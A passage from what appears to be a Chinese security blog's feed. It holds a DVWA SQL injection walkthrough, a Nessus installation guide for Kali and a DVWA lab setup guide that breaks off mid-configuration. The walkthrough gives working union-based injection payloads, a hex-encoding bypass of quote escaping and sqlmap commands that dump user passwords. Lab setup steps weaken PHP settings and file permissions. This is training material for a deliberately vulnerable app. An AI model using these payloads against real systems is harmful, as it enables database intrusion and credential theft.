title="猜解SQL查询语句中的字段数"></a>猜解SQL查询语句中的字段数</h2><ol><li><p>输入<code>1&#39; order by 1--</code>，返回正常</p><p> <img src="/images/baji/dvwa/SQL Injection/5.png" alt="5.png"></p></li><li><p>输入<code>1&#39; order by 2--</code>，返回正常</p><p> <img src="/images/baji/dvwa/SQL Injection/6.png" alt="6.png"></p></li><li><p>输入<code>1&#39; order by 3--</code>，出现报错</p><p> <img src="/images/baji/dvwa/SQL Injection/7.png" alt="7.png"></p></li></ol><p>说明执行的<code>SQL</code>查询语句中只有两个字段(即查询一个数据表中的两列)，即这里的<code>First name</code>、<code>Surname</code></p><p>可猜出查询语句为<code>select 字段1,字段2 from 表 where 字段=&#39;&#39;;</code></p><h2 id="获取当前数据库"><a href="#获取当前数据库" class="headerlink" title="获取当前数据库"></a>获取当前数据库</h2><p>输入<code>1&#39; union select 1,database()--</code></p><p><img src="/images/baji/dvwa/SQL Injection/8.png" alt="8.png"></p><p>说明当前查询的数据库为<code>dvwa</code></p><h2 id="获取dvwa数据库中的表"><a href="#获取dvwa数据库中的表" class="headerlink" title="获取dvwa数据库中的表"></a>获取dvwa数据库中的表</h2><p><code>information_schema</code>数据库是<code>MySQL</code>自带的，它提供了访问数据库元数据的方式</p><p>其中保存着关于<code>MySQL</code>服务器所维护的所有其他数据库的信息。如：数据库名，数据库的表，列的数据类型与访问权限等</p><p><code>information_schema</code>数据库的<code>table</code>表：提供了关于数据库中的表的信息（包括视图）。详细表述了某个表属于哪个数据库，表类型，表引擎，创建时间等信息</p><p>输入<code>1&#39; union select 1,group_concat(table_name) from information_schema.tables where table_schema=&#39;dvwa&#39;--</code></p><p><img src="/images/baji/dvwa/SQL Injection/9.png" alt="9.png"></p><p>说明<code>dvwa</code>数据库中存在<code>guestbook</code>，<code>users</code>两张表</p><p>可猜出查询语句为<code>select 字段1,字段2 from users where 字段=&#39;&#39;;</code></p><h2 id="获取dvwa库users表中的列名"><a href="#获取dvwa库users表中的列名" class="headerlink" title="获取dvwa库users表中的列名"></a>获取dvwa库users表中的列名</h2><p><code>information_schema</code>数据库的<code>columns</code>表：提供了表中的列信息。详细表述了某张表的所有列以及每个列的信息</p><p>输入<code>1&#39; union select 1,group_concat(column_name) from information_schema.columns where table_name=&#39;users&#39;--</code></p><p><img src="/images/baji/dvwa/SQL Injection/10.png" alt="10.png"></p><p>发现<code>dvwa</code>库<code>users</code>表中有8列(即字段)，分别是<code>user_id</code>,<code>first_name</code>,<code>last_name</code>,<code>user</code>,<code>password</code>,<code>avatar</code>,<code>last_login</code>,<code>failed_login</code></p><p>可猜出查询语句为<code>select first_name,last_name from users where user_id=&#39;&#39;;</code></p><h2 id="获取数据记录"><a href="#获取数据记录" class="headerlink" title="获取数据记录"></a>获取数据记录</h2><p>输入<code>1&#39; union select group_concat(user_id,first_name,last_name),group_concat(password) from users--</code></p><p><img src="/images/baji/dvwa/SQL Injection/11.png" alt="11.png"></p><p>则得到了<code>dvwa</code>库中<code>users</code>表中所有用户的<code>user_id</code>,<code>first_name</code>,<code>last_name</code>,<code>password</code>的数据</p><hr><h1 id="Medium级别漏洞利用"><a href="#Medium级别漏洞利用" class="headerlink" title="Medium级别漏洞利用"></a>Medium级别漏洞利用</h1><h2 id="判断是否存在注入，注入是字符型还是数字型-1"><a href="#判断是否存在注入，注入是字符型还是数字型-1" class="headerlink" title="判断是否存在注入，注入是字符型还是数字型"></a>判断是否存在注入，注入是字符型还是数字型</h2><p>前端使用下拉框限制输入参数</p><p><img src="/images/baji/dvwa/SQL Injection/12.png" alt="12.png"></p><p>可以使用<code>BurpSuite</code>进行抓包修改输入参数</p><ol><li><p>改包，使输入为<code>&#39;</code></p><p> <img src="/images/baji/dvwa/SQL Injection/13.png" alt="13.png"></p><p> 报错</p><p> <img src="/images/baji/dvwa/SQL Injection/14.png" alt="14.png"></p><p> 发现对<code>&#39;</code>进行了转义处理</p></li><li><p>改包，使输入为<code>1&#39; and &#39;1&#39;=&#39;1</code></p><p> <img src="/images/baji/dvwa/SQL Injection/15.png" alt="15.png"></p><p> 报错</p><p> <img src="/images/baji/dvwa/SQL Injection/16.png" alt="16.png"></p></li><li><p>改包，使输入为<code>1 and 1=1</code></p><p> <img src="/images/baji/dvwa/SQL Injection/17.png" alt="17.png"></p><p> 正常返回</p><p> <img src="/images/baji/dvwa/SQL Injection/18.png" alt="18.png"></p></li><li><p>改包，使输入为<code>1 and 1=2</code></p><p> <img src="/images/baji/dvwa/SQL Injection/20.png" alt="20.png"></p><p> 无返回</p><p> <img src="/images/baji/dvwa/SQL Injection/19.png" alt="19.png"></p></li></ol><p>可进行逻辑运算，且出现数据库报错，此为基于报错的<code>SQL</code>注入，但对<code>&#39;</code>等特殊符号进行转义</p><p>无需使用<code>&#39;</code>引号来进行闭合，为数字型<code>SQL</code>注入</p><p>由于是数字型注入，服务器端对特殊字符的转义就形同虚设了，因为数字型注入并不需要借助引号</p><p>可猜出查询语句为<code>select [字段1,字段2,...] from 表 where 字段= ;</code></p><h2 id="猜解SQL查询语句中的字段数-1"><a href="#猜解SQL查询语句中的字段数-1" class="headerlink" title="猜解SQL查询语句中的字段数"></a>猜解SQL查询语句中的字段数</h2><ol><li><p>改包，使输入为<code>1 order by 2--</code></p><p> <img src="/images/baji/dvwa/SQL Injection/21.png" alt="21.png"></p></li><li><p>改包，使输入为<code>1 order by 3--</code></p><p> 报错</p><p> <img src="/images/baji/dvwa/SQL Injection/22.png" alt="22.png"></p></li></ol><p>说明执行的<code>SQL</code>查询语句中只有两个字段(即查询一个数据表中的两列)，即这里的<code>First name</code>、<code>Surname</code></p><p>可猜出查询语句为<code>select 字段1,字段2 from 表 where 字段= ;</code></p><h2 id="获取当前数据库-1"><a href="#获取当前数据库-1" class="headerlink" title="获取当前数据库"></a>获取当前数据库</h2><p>改包，使输入为<code>1 union select 1,database()--</code></p><p><img src="/images/baji/dvwa/SQL Injection/23.png" alt="23.png"></p><p>说明当前的数据库为<code>dvwa</code></p><h2 id="获取dvwa数据库中的表-1"><a href="#获取dvwa数据库中的表-1" class="headerlink" title="获取dvwa数据库中的表"></a>获取dvwa数据库中的表</h2><p>改包，使输入为<code>1 union select 1,group_concat(table_name) from information_schema.tables where table_schema=database()--</code></p><p><img src="/images/baji/dvwa/SQL Injection/24.png" alt="24.png"></p><p>说明<code>dvwa</code>数据库中存在<code>guestbook</code>，<code>users</code>两张表</p><p>可猜出查询语句为<code>select 字段1,字段2 from users where 字段= ;</code></p><h2 id="获取dvwa库users表中的列名-1"><a href="#获取dvwa库users表中的列名-1" class="headerlink" title="获取dvwa库users表中的列名"></a>获取dvwa库users表中的列名</h2><ol><li><p>改包，使输入为<code>1 union select 1,group_concat(column_name) from information_schema.columns where table_name=&#39;users&#39;--</code></p><p> 查询失败</p><p> <img src="/images/baji/dvwa/SQL Injection/25.png" alt="25.png"></p><p> 因对<code>&#39;</code>等特殊字符进行了转义，所以查询失败</p></li><li><p>使用十六进制对过滤进行绕过</p><p> 使用<code>BurpSuite</code>将<code>users</code>转换为十六进制<code>0x7573657273</code></p><p> <img src="/images/baji/dvwa/SQL Injection/26.png" alt="26.png"></p><p> 改包，使输入为<code>1 union select 1,group_concat(column_name) from information_schema.columns where table_name=0x7573657273--</code></p><p> <img src="/images/baji/dvwa/SQL Injection/27.png" alt="27.png"></p></li></ol><p>发现<code>dvwa</code>库<code>users</code>表中有8列(即字段)，分别是<code>user_id</code>,<code>first_name</code>,<code>last_name</code>,<code>user</code>,<code>password</code>,<code>avatar</code>,<code>last_login</code>,<code>failed_login</code></p><p>可猜出查询语句为<code>select first_name,last_name from users where user_id= ;</code></p><h2 id="获取数据记录-1"><a href="#获取数据记录-1" class="headerlink" title="获取数据记录"></a>获取数据记录</h2><p>改包，使输入为<code>1 union select group_concat(user_id,first_name,last_name),group_concat(password) from users--</code></p><p><img src="/images/baji/dvwa/SQL Injection/28.png" alt="28.png"></p><p>则得到了<code>dvwa</code>库中<code>users</code>表中所有用户的<code>user_id</code>,<code>first_name</code>,<code>last_name</code>,<code>password</code>的数据</p><hr><h1 id="High级别漏洞利用"><a href="#High级别漏洞利用" class="headerlink" title="High级别漏洞利用"></a>High级别漏洞利用</h1><h2 id="判断是否存在注入，注入是字符型还是数字型-2"><a href="#判断是否存在注入，注入是字符型还是数字型-2" class="headerlink" title="判断是否存在注入，注入是字符型还是数字型"></a>判断是否存在注入，注入是字符型还是数字型</h2><p><code>High</code>级别的查询提交页面与查询结果显示页面不是同一个，也没有执行302跳转，这样做的目的是为了防止一般的<code>sqlmap</code>注入，因为<code>sqlmap</code>在注入过程中，无法在查询提交页面上获取查询的结果，没有了反馈，也就没办法进一步注入</p><p><img src="/images/baji/dvwa/SQL Injection/29.png" alt="29.png"></p><p><img src="/images/baji/dvwa/SQL Injection/30.png" alt="30.png"></p><p><code>High</code>级别在<code>low</code>级别的基础上，在<code>SQL</code>查询语句后加入<code>LIMIT 1</code>，用于希望以此控制只输出一个结果，可通过<code>--</code>注释符来进行注释</p><p><code>High</code>级别对数据库报错进行了处理，显示统一的报错信息</p><p>与<code>low</code>级别的注入基本相似</p><hr><h1 id="Impossible级别"><a href="#Impossible级别" class="headerlink" title="Impossible级别"></a>Impossible级别</h1><p><code>Impossible</code>级别的代码采用了<code>PDO</code>技术，划清了代码与数据的界限，有效防御<code>SQL</code>注入，同时只有返回的查询结果数量为一时，才会成功输出，这样就有效预防了“脱裤”，<code>Anti-CSRFtoken</code>机制的加入了进一步提高了安全性</p><p><code>PHP</code>数据对象（<code>PDO</code>）扩展为<code>PHP</code>访问数据库定义了一个轻量级的一致接口</p><p><code>PDO</code>提供了一个数据访问抽象层，这意味着，不管使用哪种数据库，都可以用相同的函数（方法）来查询和获取数据</p><hr><h1 id="SQL注入防御"><a href="#SQL注入防御" class="headerlink" title="SQL注入防御"></a>SQL注入防御</h1><ol><li><p>所有的查询语句都使用数据库提供的参数化查询接口</p></li><li><p>对进入数据库的特殊字符(<code>&#39;</code>，<code>&quot;</code>，<code>select</code>，<code>union</code>，<code>--</code>，<code>#</code>，<code>order by</code>)进行转义处理，或编码转换</p></li><li><p>严格限制数据类型</p></li><li><p>严格限制参数长度</p></li><li><p>网站每个数据层的编码统一，建议<code>UTF-8</code></p></li><li><p>严格限制网站用户的数据库的操作权限，最小权限原则</p></li><li><p>统一错误信息提示</p></li><li><p>使用预编译语句</p></li><li><p>使用存储过程</p></li><li><p>白名单验证输入</p></li></ol><hr><h1 id="SQLMAP"><a href="#SQLMAP" class="headerlink" title="SQLMAP"></a>SQLMAP</h1><h2 id="爆数据库"><a href="#爆数据库" class="headerlink" title="爆数据库"></a>爆数据库</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 sqlmap.py -u &quot;http://172.16.12.85/vulnerabilities/sqli/?id=1&amp;Submit=Submit&quot; --cookie=&quot;PHPSESSID=cc7cccd8ffe7bb1d03328b0dace970db; security=low&quot; --dbs --batch</span><br></pre></td></tr></table></figure><p><img src="/images/baji/dvwa/SQL Injection/31.png" alt="31.png"></p><h2 id="爆表"><a href="#爆表" class="headerlink" title="爆表"></a>爆表</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 sqlmap.py -u &quot;http://172.16.12.85/vulnerabilities/sqli/?id=1&amp;Submit=Submit&quot; --cookie=&quot;PHPSESSID=cc7cccd8ffe7bb1d03328b0dace970db; security=low&quot; -D dvwa --tables --batch</span><br></pre></td></tr></table></figure><p><img src="/images/baji/dvwa/SQL Injection/32.png" alt="32.png"></p><h2 id="爆字段"><a href="#爆字段" class="headerlink" title="爆字段"></a>爆字段</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 sqlmap.py -u &quot;http://172.16.12.85/vulnerabilities/sqli/?id=1&amp;Submit=Submit&quot; --cookie=&quot;PHPSESSID=cc7cccd8ffe7bb1d03328b0dace970db; security=low&quot; -D dvwa -T users --column --batch</span><br></pre></td></tr></table></figure><p><img src="/images/baji/dvwa/SQL Injection/33.png" alt="33.png"></p><h2 id="爆数据"><a href="#爆数据" class="headerlink" title="爆数据"></a>爆数据</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 sqlmap.py -u &quot;http://172.16.12.85/vulnerabilities/sqli/?id=1&amp;Submit=Submit&quot; --cookie=&quot;PHPSESSID=cc7cccd8ffe7bb1d03328b0dace970db; security=low&quot; -D dvwa -T users -C user,password --dump --batch</span><br></pre></td></tr></table></figure><p><img src="/images/baji/dvwa/SQL Injection/34.png" alt="34.png"></p><p><img src="/images/baji/dvwa/SQL Injection/35.png" alt="35.png"></p>]]></content>
    
    <summary type="html">
    
      &lt;hr&gt;
    
    </summary>
    
      <category term="靶机" scheme="http://yoursite.com/categories/%E9%9D%B6%E6%9C%BA/"/>
    
    
      <category term="DVWA1.10" scheme="http://yoursite.com/tags/DVWA1-10/"/>
    
  </entry>
  
  <entry>
    <title>kali下安装nessus</title>
    <link href="http://yoursite.com/2019/05/11/kali%E4%B8%8B%E5%AE%89%E8%A3%85nessus/"/>
    <id>http://yoursite.com/2019/05/11/kali下安装nessus/</id>
    <published>2019-05-10T17:11:00.000Z</published>
    <updated>2020-02-24T04:31:21.168Z</updated>
    
    <content type="html"><![CDATA[<hr><a id="more"></a><h1 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h1><p>下载地址： <a href="https://www.tenable.com/downloads/nessus" target="_blank" rel="noopener">https://www.tenable.com/downloads/nessus</a></p><p>选择对应的安装包</p><p><img src="/images/shentouceshi_tools/nessus/1.png" alt="1.png"></p><h1 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dpkg -i Nessus-8.3.2-ubuntu910_amd64.deb</span><br></pre></td></tr></table></figure><p><img src="/images/shentouceshi_tools/nessus/2.png" alt="2.png"></p><h1 id="启动"><a href="#启动" class="headerlink" title="启动"></a>启动</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/etc/init.d/nessusd start</span><br></pre></td></tr></table></figure><p><img src="/images/shentouceshi_tools/nessus/3.png" alt="3.png"></p><h1 id="访问"><a href="#访问" class="headerlink" title="访问"></a>访问</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://127.0.0.1:8834</span><br></pre></td></tr></table></figure><p><img src="/images/shentouceshi_tools/nessus/4.png" alt="4.png"></p><p>信任该地址</p><p><img src="/images/shentouceshi_tools/nessus/17.png" alt="17.png"></p><p><img src="/images/shentouceshi_tools/nessus/5.png" alt="5.png"></p><p>设置用户名、密码</p><h1 id="激活"><a href="#激活" class="headerlink" title="激活"></a>激活</h1><p><img src="/images/shentouceshi_tools/nessus/6.png" alt="6.png"></p><h2 id="在线获取激活码"><a href="#在线获取激活码" class="headerlink" title="在线获取激活码"></a>在线获取激活码</h2><p>访问 <a href="https://www.tenable.com/products/nessus/activation-code" target="_blank" rel="noopener">https://www.tenable.com/products/nessus/activation-code</a></p><p><img src="/images/shentouceshi_tools/nessus/7.png" alt="7.png"></p><p>填写名称、邮箱</p><p><img src="/images/shentouceshi_tools/nessus/8.png" alt="8.png"></p><p>下一步后，邮箱会收到一封邮件，其中包含有激活码</p><p>填写到上方激活码的填写位置，即可激活家庭免费版</p><p>之后就会自动进行插件的下载、安装</p><p><img src="/images/shentouceshi_tools/nessus/9.png" alt="9.png"></p><h2 id="离线获取激活码"><a href="#离线获取激活码" class="headerlink" title="离线获取激活码"></a>离线获取激活码</h2><p>在内网主机完成程序安装后由于无法访问外网，所以需要离线激活</p><ol><li><p>获取设备代码</p><p> <img src="/images/shentouceshi_tools/nessus/100.png" alt="10.png"></p><p> 选择<code>offline</code>选项，并复制设备代码</p><p> 也可通过</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd /opt/nessus/sbin</span><br><span class="line">./nessuscli fetch --challenge</span><br></pre></td></tr></table></figure><p> 获取设备代码</p></li><li><p>获取激活码</p><p> 访问 <a href="https://www.tenable.com/products/nessus/activation-code" target="_blank" rel="noopener">https://www.tenable.com/products/nessus/activation-code</a></p><p> <img src="/images/shentouceshi_tools/nessus/7.png" alt="7.png"></p><p> 填写名称、邮箱</p><p> <img src="/images/shentouceshi_tools/nessus/8.png" alt="8.png"></p><p> 下一步后，邮箱会收到一封邮件，其中包含有激活码</p></li><li><p>获取离线激活码</p><p> 访问 <a href="https://plugins.nessus.org/v2/offline.php" target="_blank" rel="noopener">https://plugins.nessus.org/v2/offline.php</a></p><p> <img src="/images/shentouceshi_tools/nessus/11.png" alt="11.png"></p><p> 上方填写设备代码，下方填写邮件收到的激活码</p><p> 下一步后，会获取<code>license</code>文本及<code>nessus.license</code>文件</p><p> <img src="/images/shentouceshi_tools/nessus/122.png" alt="12.png"></p><p> <strong>注意，需同时下载上方红框中的离线插件安装包，用于后续离线安装插件</strong></p><p> 将<code>license</code>文本复制，填写到激活界面</p><p> <img src="/images/shentouceshi_tools/nessus/133.png" alt="13.png"></p><p> 即可完成离线激活</p><p> 接下来会进行插件的下载、安装过程，但因无法连接外网，所以插件下载并不会成功</p></li></ol><hr><h1 id="插件问题"><a href="#插件问题" class="headerlink" title="插件问题"></a>插件问题</h1><p><code>Nessus</code>扫描器在先部署完成时，一般在输入激活码以后会自动在线下载插件包进行更新，但是有时候因为诸多原因如网络不稳定、磁盘空间不足或人为中止了插件下载等，都会导致插件更新失败，另外因没网络选择离线部署时也需要单独更新插件，这时就需要手动下载插件并更新</p><p><img src="/images/shentouceshi_tools/nessus/14.png" alt="14.png"></p><p>此时应进行离线插件安装，这时就需要上方提前下载的离线插件安装包</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd /opt/nessus/sbin/</span><br><span class="line">./nessuscli update ~/all-2.0.tar.gz</span><br></pre></td></tr></table></figure><p><img src="/images/shentouceshi_tools/nessus/188.png" alt="18.png"></p><p>重新启动</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./nessusd</span><br></pre></td></tr></table></figure><p><img src="/images/shentouceshi_tools/nessus/19.png" alt="19.png"></p><p>访问<code>https://127.0.0.1:8834</code>，输入前面设置的用户名、密码即可</p><p><img src="/images/shentouceshi_tools/nessus/16.png" alt="16.png"></p>]]></content>
    
    <summary type="html">
    
      &lt;hr&gt;
    
    </summary>
    
      <category term="工具" scheme="http://yoursite.com/categories/%E5%B7%A5%E5%85%B7/"/>
    
    
      <category term="漏洞扫描" scheme="http://yoursite.com/tags/%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F/"/>
    
  </entry>
  
  <entry>
    <title>DVWA靶机</title>
    <link href="http://yoursite.com/2019/05/05/DVWA%E9%9D%B6%E6%9C%BA/"/>
    <id>http://yoursite.com/2019/05/05/DVWA靶机/</id>
    <published>2019-05-05T07:58:00.000Z</published>
    <updated>2020-02-24T04:20:59.261Z</updated>
    
    <content type="html"><![CDATA[<hr><a id="more"></a><h1 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h1><h2 id="操作系统"><a href="#操作系统" class="headerlink" title="操作系统"></a>操作系统</h2><p><code>CentOS 7</code></p><h2 id="中间件、数据库等"><a href="#中间件、数据库等" class="headerlink" title="中间件、数据库等"></a>中间件、数据库等</h2><p>使用<code>xampp</code>完整包集成环境</p><h3 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h3><p><a href="https://www.apachefriends.org/zh_cn/download.html" target="_blank" rel="noopener">https://www.apachefriends.org/zh_cn/download.html</a></p><h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chmod +x xampp-linux-x64-7.3.4-0-installer.run</span><br><span class="line">./xampp-linux-x64-7.3.4-0-installer.run</span><br></pre></td></tr></table></figure><p><img src="/images/baji/dvwa/1.png" alt="1.png"></p><h3 id="启动"><a href="#启动" class="headerlink" title="启动"></a>启动</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd /opt/lampp/</span><br><span class="line">./lampp start</span><br></pre></td></tr></table></figure><p>会提示<code>ok</code>，启动成功</p><h3 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h3><h4 id="安全性设置"><a href="#安全性设置" class="headerlink" title="安全性设置"></a>安全性设置</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./lampp security</span><br></pre></td></tr></table></figure><p><img src="/images/baji/dvwa/2.png" alt="2.png"></p><ol><li><p>重启<code>mysql</code></p></li><li><p>设置<code>mysql/phpadmin</code>用户<code>pma</code>的密码</p></li><li><p>设置<code>mysql</code>用户<code>root</code>的密码</p></li><li><p>设置<code>ftp</code>用户<code>daemon</code>的密码</p></li></ol><p>重启服务</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./lampp restart</span><br></pre></td></tr></table></figure><h4 id="访问设置"><a href="#访问设置" class="headerlink" title="访问设置"></a>访问设置</h4><ol><li><p>设置<code>ServerName</code></p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd /opt/lampp/etc/</span><br><span class="line">vi httpd.conf</span><br></pre></td></tr></table></figure><p> 修改<code>ServerName</code>行,设置为：</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ServerName localhost:80</span><br></pre></td></tr></table></figure><p>重启服务</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd /opt/lampp/</span><br><span class="line">./lampp restart</span><br></pre></td></tr></table></figure></li><li><p>开放防火墙80端口</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">firewall-cmd --zone=public --add-port=80/tcp --permanent</span><br><span class="line">firewall-cmd --reload</span><br></pre></td></tr></table></figure></li></ol><p>同网络下主机即可访问</p><p><img src="/images/baji/dvwa/10.png" alt="10.png"></p><h2 id="配置dvwa靶机"><a href="#配置dvwa靶机" class="headerlink" title="配置dvwa靶机"></a>配置dvwa靶机</h2><h3 id="部署"><a href="#部署" class="headerlink" title="部署"></a>部署</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">unzip DVWA-master.zip -d /opt/lampp/htdocs/</span><br></pre></td></tr></table></figure><h3 id="设置访问"><a href="#设置访问" class="headerlink" title="设置访问"></a>设置访问</h3><ol><li><p>更改网站根目录</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vi /opt/lampp/etc/httpd.conf</span><br></pre></td></tr></table></figure><p> 将<code>DocumentRoot &quot;/opt/lampp/htdocs&quot;</code>更改为<code>DocumentRoot &quot;/opt/lampp/htdocs/DVWA-master&quot;</code></p></li><li><p>设置<code>dvwa</code>配置文件</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd /opt/lampp/htdocs/DVWA-master/config</span><br><span class="line">cp config.inc.php.dist config.inc.php</span><br></pre></td></tr></table></figure></li></ol><p>重启<code>lampp</code>服务即可访问</p><p><img src="/images/baji/dvwa/3.png" alt="3.png"></p><h3 id="配置DVWA"><a href="#配置DVWA" class="headerlink" title="配置DVWA"></a>配置DVWA</h3><ol><li><p><code>PHP function allow_url_include: Disabled</code></p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vi /opt/lampp/etc/php.ini</span><br></pre></td></tr></table></figure><p>将<code>allow_url_include=Off</code>改为<code>allow_url_include=On</code></p></li><li><p><code>reCAPTCHA key: Missing</code></p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vi /opt/lampp/htdocs/DVWA-master/config/config.inc.php</span><br></pre></td></tr></table></figure><p>将</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$_DVWA[ &apos;recaptcha_public_key&apos; ]  = &apos;&apos;;</span><br><span class="line">$_DVWA[ &apos;recaptcha_private_key&apos; ] = &apos;&apos;;</span><br></pre></td></tr></table></figure><p>改为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$_DVWA[ &apos;recaptcha_public_key&apos; ]  = &apos;6LdK7xITAAzzAAJQTfL7fu6I-0aPl8KHHieAT_yJg&apos;;</span><br><span class="line">$_DVWA[ &apos;recaptcha_private_key&apos; ] = &apos;6LdK7xITAzzAAL_uw9YXVUOPoIHPZLfw2K1n5NVQ&apos;;</span><br></pre></td></tr></table></figure></li></ol><ol start="3"><li><p><code>Unable to connect to the database.</code></p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vi /opt/lampp/htdocs/DVWA-master/config/config.inc.php</span><br></pre></td></tr></table></figure><p> 将<code>$_DVWA[ &#39;db_password&#39; ] = &#39;&#39;;</code>中的值改为自己<code>mysql</code>的<code>root</code>用户的密码</p></li><li><p>对目录无可写权限</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">chmod 757 /opt/lampp/htdocs/DVWA-master/hackable/uploads/</span><br><span class="line">chmod 646 /opt/lampp/htdocs/DVWA-master/external/phpids/0.6/lib/IDS/tmp/phpids_log.txt</span><br><span class="line">chmod 757 /opt/lampp/htdocs/DVWA-master/config</span><br></pre></td></tr></table></figure></li></ol><ol start="5"><li><p>重启服务</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd /opt/lampp/</span><br><span class="line">./lampp restart</span><br></pre></td></tr></table></figure></li></ol><p>刷新页面即可</p><p><img src="/images/baji/dvwa/4.png" alt="4.png"></p><h3 id="开始使用"><a href="#开始使用" class="headerlink" title="开始使用"></a>开始使用</h3><p>点击<code>Create/Reset Database</code>后会创建数据库</p><p>报错：</p><p><img src="/images/baji/dvwa/5.png" alt="5.png"></p><p>默认安装的是<code>MariaDB</code>数据库，并不是<code>Mysql</code>，不能按照<code>Mysql</code>的配置来不然会报错</p><p>解决：</p><ol><li><p>停止<code>lampp</code>服务</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd /opt/lampp/</span><br><span class="line">./lampp stop</span><br></pre></td></tr></table></figure></li><li><p>删除一些缓存文件</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">rm -rf /opt/lampp/var/mysql/VM_* # 删除mysql相关缓存</span><br><span class="line">rm -rf /opt/lampp/var/proftpd.pid# 删除proftp相关缓存</span><br></pre></td></tr></table></figure></li></ol><ol start="3"><li><p>启动<code>lampp</code>服务</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd /opt/lampp/</span><br><span class="line">./lampp start</span><br></pre></td></tr></table></figure></li></ol><ol start="4"><li><p>启动进入<code>mysql</code></p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd /opt/lampp/bin/</span><br><span class="line">./mysql -uroot -p</span><br></pre></td></tr></table></figure><p> 输入密码，进入</p><p> <img src="/images/baji/dvwa/6.png" alt="6.png"></p></li><li><p>配置数据库</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use mysql;</span><br><span class="line">create user dvwa;</span><br><span class="line">grant all on dvwa.* to dvwa@localhost identified by &apos;123456&apos;;</span><br><span class="line">flush privileges;</span><br><span class="line">exit</span><br></pre></td></tr></table></figure><p> <img src="/images/baji/dvwa/777.png" alt="7.png"></p></li><li><p>修改配置文件</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vi /opt/lampp/htdocs/DVWA-master/config/config.inc.php</span><br></pre></td></tr></table></figure><p> 将</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$_DVWA[ &apos;db_server&apos; ]   = 